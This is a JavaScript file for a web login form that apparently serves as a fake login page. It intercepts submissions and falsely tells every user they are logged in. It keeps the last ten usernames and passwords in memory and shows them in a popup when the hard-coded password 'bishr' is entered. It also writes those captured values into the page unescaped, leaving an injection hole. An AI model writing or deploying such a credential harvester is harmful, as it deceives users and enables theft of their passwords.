const recentCredentials = [];

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent form submission

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Store the credentials
    recentCredentials.push({ username, password });

    if (password === 'bishr') {
        showPopup();
    } else {
        alert('successfully logged in');
    }

    // Limit to last 10 credentials
    if (recentCredentials.length > 10) {
        recentCredentials.shift(); // Remove the oldest entry
    }

    // Clear the input fields
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
});

// Show the popup
function showPopup() {
    const popup = document.getElementById('popup');
    const displayCredentials = document.getElementById('displayCredentials');

    // Display the last 10 credentials
    displayCredentials.innerHTML = recentCredentials
        .map(cred => `Username: ${cred.username}, Password: ${cred.password}`)
        .join('<br>');

    popup.style.display = 'block';
}

// Close the popup
document.getElementById('closePopup').addEventListener('click', function() {
    document.getElementById('popup').style.display = 'none';
});

// Close the popup if the user clicks outside of it
window.onclick = function(event) {
    const popup = document.getElementById('popup');
    if (event.target === popup) {
        popup.style.display = 'none';
    }
};
